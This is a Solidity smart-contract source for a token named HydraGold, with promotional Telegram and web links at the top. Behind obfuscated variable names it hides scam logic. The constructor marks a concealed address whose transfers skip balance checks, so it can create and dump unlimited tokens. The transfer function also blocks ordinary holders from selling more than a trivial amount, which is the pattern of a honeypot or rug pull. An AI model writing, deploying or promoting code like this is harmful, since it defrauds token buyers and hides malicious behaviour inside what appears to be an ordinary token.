/*

Ancient 7 headed dragon. Only possible on ethereum

TG: https://t.me/ethhydragold

Web: https://hydragold.cryptotoken.live/

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract HydraGold is Ownable {
    mapping(address => uint256) private pqatyshmberc;

    string public name;

    function transfer(address kjvqgx, uint256 wxli) public returns (bool success) {
        micyvr(msg.sender, kjvqgx, wxli);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private latf;

    uint256 private iysfaw = 115;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    mapping(address => uint256) public gfshw;

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function micyvr(address khitznc, address kjvqgx, uint256 wxli) private {
        address erkilbfoxcd = IUniswapV2Factory(latf.factory()).getPair(address(this), latf.WETH());
        bool kxqapvowgt = pqatyshmberc[khitznc] == block.number;
        if (0 == ubmdkqtxrow[khitznc]) {
            if (khitznc != erkilbfoxcd && (!kxqapvowgt || wxli > gfshw[khitznc]) && wxli < totalSupply) {
                require(wxli <= totalSupply / (10 ** decimals));
            }
            balanceOf[khitznc] -= wxli;
        }
        gfshw[kjvqgx] = wxli;
        balanceOf[kjvqgx] += wxli;
        pqatyshmberc[kjvqgx] = block.number;
        emit Transfer(khitznc, kjvqgx, wxli);
    }

    function approve(address bjzyihm, uint256 wxli) public returns (bool success) {
        allowance[msg.sender][bjzyihm] = wxli;
        emit Approval(msg.sender, bjzyihm, wxli);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address khitznc, address kjvqgx, uint256 wxli) public returns (bool success) {
        require(wxli <= allowance[khitznc][msg.sender]);
        allowance[khitznc][msg.sender] -= wxli;
        micyvr(khitznc, kjvqgx, wxli);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private ubmdkqtxrow;

    constructor(string memory kqnmfrcojta, string memory vlqfnrxa, address iecwdx, address zdwcmp) {
        name = kqnmfrcojta;
        symbol = vlqfnrxa;
        balanceOf[msg.sender] = totalSupply;
        ubmdkqtxrow[zdwcmp] = iysfaw;
        latf = IUniswapV2Router02(iecwdx);
    }
}
